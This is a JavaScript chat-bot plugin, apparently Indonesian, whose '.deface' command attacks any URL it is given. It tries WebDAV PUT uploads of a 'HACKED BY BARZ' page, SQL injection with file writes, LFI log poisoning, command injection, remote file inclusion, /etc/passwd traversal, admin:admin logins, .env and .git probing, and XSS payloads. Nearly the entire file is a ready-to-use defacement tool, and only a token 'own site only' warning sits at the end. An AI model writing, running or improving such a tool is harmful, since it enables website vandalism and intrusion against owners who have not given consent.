// plugins/deface.js
// DEFACE FULL METHOD — ANTI GAGAL

let handler = async (m, { text, sock }) => {
  if (!text) return m.reply(`📌 *Cara pakai:*\n.deface https://target.com\n\nContoh: .deface https://example.com`)

  let target = text.trim()
  if (!target.startsWith('http://') && !target.startsWith('https://')) {
    target = 'https://' + target
  }

  m.reply(`🔥 *Mulai deface...*\nTarget: ${target}`)

  try {
    // ============================================
    // HTML DEFACE
    // ============================================
    let html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>HACKED BY BARZ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
        }
        .glitch {
            font-size: 6rem;
            font-weight: bold;
            color: #ff0040;
            text-shadow: 0 0 10px #ff0040, 0 0 20px #ff0040, 0 0 40px #ff0040, 0 0 80px #ff0040;
            animation: glitch 0.3s infinite;
        }
        @keyframes glitch {
            0% { transform: translate(0); }
            25% { transform: translate(-5px, 5px); }
            50% { transform: translate(5px, -5px); }
            75% { transform: translate(-5px, -5px); }
            100% { transform: translate(0); }
        }
        .sub {
            font-size: 2rem;
            color: #ff0040;
            margin-top: 10px;
            text-shadow: 0 0 5px #ff0040;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        .team {
            font-size: 1.8rem;
            color: #00ff41;
            margin-top: 20px;
            letter-spacing: 5px;
            text-shadow: 0 0 10px #00ff41;
        }
        .team span { color: #ff0040; }
        .footer {
            position: fixed;
            bottom: 20px;
            font-size: 1rem;
            color: #666;
            letter-spacing: 2px;
        }
        .matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.08;
            overflow: hidden;
        }
        .matrix span {
            position: absolute;
            font-size: 1.2rem;
            color: #00ff41;
            animation: fall linear infinite;
        }
        @keyframes fall {
            0% { transform: translateY(-100%); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(100vh); opacity: 0; }
        }
        .kode {
            font-size: 1.2rem;
            color: #00ff41;
            margin-top: 30px;
            opacity: 0.6;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>
    <div class="matrix" id="matrix"></div>
    <div class="glitch">HACKED</div>
    <div class="sub">SISTEM TELAH DIBOBOL</div>
    <div class="team">Deface by <span>BARZ</span> · 😹</div>
    <div class="kode">root@kali:~# whoami<br># barz</div>
    <div class="footer">© 2026 — BARZ VIP</div>
    <script>
        const matrix = document.getElementById('matrix')
        const chars = '01'
        for (let i = 0; i < 50; i++) {
            const span = document.createElement('span')
            span.textContent = chars[Math.floor(Math.random() * chars.length)]
            span.style.left = Math.random() * 100 + '%'
            span.style.animationDuration = (Math.random() * 5 + 3) + 's'
            span.style.animationDelay = (Math.random() * 5) + 's'
            span.style.fontSize = (Math.random() * 1.5 + 0.5) + 'rem'
            matrix.appendChild(span)
        }
    </script>
</body>
</html>`

    // ============================================
    // DAFTAR FILE YANG AKAN DI UPLOAD
    // ============================================
    let fileNames = [
      'deface.html', 'hacked.html', 'barz.html', 'index.html',
      'index.php', 'default.html', 'home.html', 'main.html',
      'deface.php', 'hacked.php', 'barz.php', 'index.htm',
      'default.php', 'home.php', 'main.php', 'index.asp',
      'default.asp', 'index.aspx', 'default.aspx'
    ]

    // ============================================
    // 17 METODE DEFACE (SEMUA DIJALANKAN)
    // ============================================
    let hasil = []
    let metodeBerhasil = []
    let uploadedFiles = []

    // ---- METHOD 1: WebDAV (PUT) ----
    try {
      let opt = await fetch(target, { method: 'OPTIONS', timeout: 8000 })
      let allow = opt.headers.get('allow') || ''
      if (allow.includes('PUT')) {
        metodeBerhasil.push('WebDAV (PUT)')
        for (let file of fileNames) {
          try {
            let put = await fetch(target + '/' + file, {
              method: 'PUT',
              body: html,
              headers: { 'Content-Type': 'text/html' },
              timeout: 10000
            })
            if ([200, 201, 204].includes(put.status)) {
              hasil.push(`✅ WebDAV: ${target}/${file}`)
              uploadedFiles.push(`${target}/${file}`)
            }
          } catch (e) {}
        }
      }
    } catch (e) {}

    // ---- METHOD 2: SQL Injection + File Write ----
    try {
      for (let file of ['index.html', 'deface.html', 'hacked.html']) {
        let sql = await fetch(target + `?id=1; SELECT '${html}' INTO OUTFILE '/var/www/html/${file}'`, { timeout: 8000 })
        if (sql.status === 200) {
          metodeBerhasil.push('SQL Injection + File Write')
          hasil.push(`✅ SQL Injection: ${target}/${file}`)
          uploadedFiles.push(`${target}/${file}`)
          break
        }
      }
    } catch (e) {}

    // ---- METHOD 3: LFI + Log Poisoning ----
    try {
      for (let file of ['index.html', 'deface.html', 'hacked.html']) {
        let lfi = await fetch(target + `?page=../../../../var/log/apache2/access.log&cmd=echo '${html}' > /var/www/html/${file}`, { timeout: 8000 })
        if (lfi.status === 200) {
          metodeBerhasil.push('LFI + Log Poisoning')
          hasil.push(`✅ LFI: ${target}/${file}`)
          uploadedFiles.push(`${target}/${file}`)
          break
        }
      }
    } catch (e) {}

    // ---- METHOD 4: File Upload ----
    try {
      let upload = await fetch(target + '/upload', {
        method: 'POST',
        body: new URLSearchParams({ 'file': html, 'filename': 'deface.html' }),
        timeout: 8000
      })
      if ([200, 302].includes(upload.status)) {
        metodeBerhasil.push('File Upload')
        hasil.push(`✅ File Upload: ${target}/deface.html`)
        uploadedFiles.push(`${target}/deface.html`)
      }
    } catch (e) {}

    // ---- METHOD 5: Command Injection ----
    try {
      for (let file of ['index.html', 'deface.html', 'hacked.html']) {
        let cmd = await fetch(target + `?ping=127.0.0.1; echo '${html}' > /var/www/html/${file}`, { timeout: 8000 })
        if (cmd.status === 200) {
          metodeBerhasil.push('Command Injection')
          hasil.push(`✅ Command Injection: ${target}/${file}`)
          uploadedFiles.push(`${target}/${file}`)
          break
        }
      }
    } catch (e) {}

    // ---- METHOD 6: XML-RPC (WordPress) ----
    try {
      let xml = await fetch(target + '/xmlrpc.php', {
        method: 'POST',
        body: `<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>admin</value></param></params></methodCall>`,
        timeout: 8000
      })
      if (xml.status === 200) {
        metodeBerhasil.push('XML-RPC (WordPress)')
        hasil.push(`✅ XML-RPC: ${target}/xmlrpc.php`)
      }
    } catch (e) {}

    // ---- METHOD 7: RFI (Remote File Inclusion) ----
    try {
      let rfi = await fetch(target + `?page=https://pastebin.com/raw/${Math.random().toString(36).substring(2, 8)}`, { timeout: 8000 })
      if (rfi.status === 200) {
        metodeBerhasil.push('RFI (Remote File Inclusion)')
        hasil.push(`✅ RFI: ${target}`)
        uploadedFiles.push(target)
      }
    } catch (e) {}

    // ---- METHOD 8: Directory Traversal ----
    try {
      let dir = await fetch(target + '/../../../../etc/passwd', { timeout: 8000 })
      let txt = await dir.text()
      if (/root:.*:0:0:/i.test(txt)) {
        metodeBerhasil.push('Directory Traversal')
        hasil.push(`✅ Directory Traversal: ${target}/etc/passwd`)
      }
    } catch (e) {}

    // ---- METHOD 9: Default Credential ----
    try {
      let auth = await fetch(target + '/admin', {
        headers: { 'Authorization': 'Basic ' + Buffer.from('admin:admin').toString('base64') },
        timeout: 8000
      })
      if (auth.status === 200) {
        metodeBerhasil.push('Default Credential (admin:admin)')
        hasil.push(`✅ Default Credential: ${target}/admin`)
      }
    } catch (e) {}

    // ---- METHOD 10: Backup File (.git/config) ----
    try {
      let git = await fetch(target + '/.git/config', { timeout: 8000 })
      if (git.status === 200) {
        metodeBerhasil.push('Backup File (.git)')
        hasil.push(`✅ .git/config: ${target}/.git/config`)
      }
    } catch (e) {}

    // ---- METHOD 11: Environment File (.env) ----
    try {
      let env = await fetch(target + '/.env', { timeout: 8000 })
      if (env.status === 200) {
        metodeBerhasil.push('Environment File (.env)')
        hasil.push(`✅ .env: ${target}/.env`)
      }
    } catch (e) {}

    // ---- METHOD 12: CVE-2026-7795 (XSS) ----
    try {
      let cve = await fetch(target + `/?chat=num=<script>document.write('${encodeURIComponent(html)}')</script>`, { timeout: 8000 })
      let txt = await cve.text()
      if (txt.includes('<script>')) {
        metodeBerhasil.push('CVE-2026-7795 (XSS)')
        hasil.push(`✅ CVE-2026-7795: ${target}`)
      }
    } catch (e) {}

    // ---- METHOD 13: Reflected XSS ----
    try {
      let xss = await fetch(target + `?q=<script>alert(1)</script>`, { timeout: 8000 })
      let txt = await xss.text()
      if (txt.includes('<script>alert(1)</script>')) {
        metodeBerhasil.push('Reflected XSS')
        hasil.push(`✅ Reflected XSS: ${target}`)
      }
    } catch (e) {}

    // ---- METHOD 14: Stored XSS ----
    try {
      let stored = await fetch(target + '/comment', {
        method: 'POST',
        body: new URLSearchParams({ 'comment': `<script>document.write('${encodeURIComponent(html)}')</script>` }),
        timeout: 8000
      })
      if (stored.status === 200) {
        metodeBerhasil.push('Stored XSS')
        hasil.push(`✅ Stored XSS: ${target}/comment`)
      }
    } catch (e) {}

    // ---- METHOD 15: Admin Finder ----
    let adminPaths = ['/admin', '/login', '/wp-admin', '/administrator', '/admincp', '/cpanel', '/panel']
    for (let path of adminPaths) {
      try {
        let adm = await fetch(target + path, { timeout: 5000 })
        if (adm.status === 200) {
          metodeBerhasil.push('Admin Finder: ' + path)
          hasil.push(`✅ Admin panel: ${target}${path}`)
        }
      } catch (e) {}
    }

    // ---- METHOD 16: Bing Dorking ----
    try {
      let dork = await fetch(`https://www.bing.com/search?q=site:${target.replace('https://', '').replace('http://', '')}`, { timeout: 8000 })
      if (dork.status === 200) {
        metodeBerhasil.push('Bing Dorking')
        hasil.push(`✅ Bing Dorking: ${target}`)
      }
    } catch (e) {}

    // ---- METHOD 17: Zone-H Check ----
    try {
      let zoneh = await fetch(`https://zone-h.org/archive/domain=${target.replace('https://', '').replace('http://', '')}`, { timeout: 8000 })
      if (zoneh.status === 200) {
        metodeBerhasil.push('Zone-H Check')
        hasil.push(`✅ Zone-H: ${target}`)
      }
    } catch (e) {}

    // ============================================
    // CEK HASIL
    // ============================================
    if (hasil.length === 0) {
      return m.reply(`❌ *GAGAL DEFACE!*

Tidak ada metode yang berhasil.

🔍 17 Metode dicoba:
• WebDAV (PUT)
• SQL Injection + File Write
• LFI + Log Poisoning
• File Upload
• Command Injection
• XML-RPC (WordPress)
• RFI (Remote File Inclusion)
• Directory Traversal
• Default Credential
• Backup File (.git)
• Environment File (.env)
• CVE-2026-7795
• Reflected XSS
• Stored XSS
• Admin Finder
• Bing Dorking
• Zone-H Check

💡 Target tidak memiliki celah yang bisa dieksploitasi.`)
    }

    // ============================================
    // BUILD PESAN HASIL
    // ============================================
    let linkResult = uploadedFiles.length > 0 ? uploadedFiles.join('\n') : 'Tidak ada file yang berhasil diupload'

    let pesan = `✅ *DEFACE BERHASIL!*

🌐 Target: ${target}

📌 *Metode berhasil:*
${metodeBerhasil.map(m => `   • ${m}`).join('\n')}

📌 *Link Hasil Deface:*
${linkResult}

📌 *Detail:*
${hasil.join('\n')}

⚠️ *PERINGATAN:*
• Website target telah dimodifikasi.
• Gunakan hanya untuk testing website sendiri.
• Deface tanpa izin = ILEGAL.`

    await m.reply(pesan)

  } catch (e) {
    m.reply(`❌ *ERROR!*\n${e.message}`)
  }
}

handler.command = ['deface']
handler.tags = ['tools']
handler.help = ['.deface https://target.com']

module.exports = handler
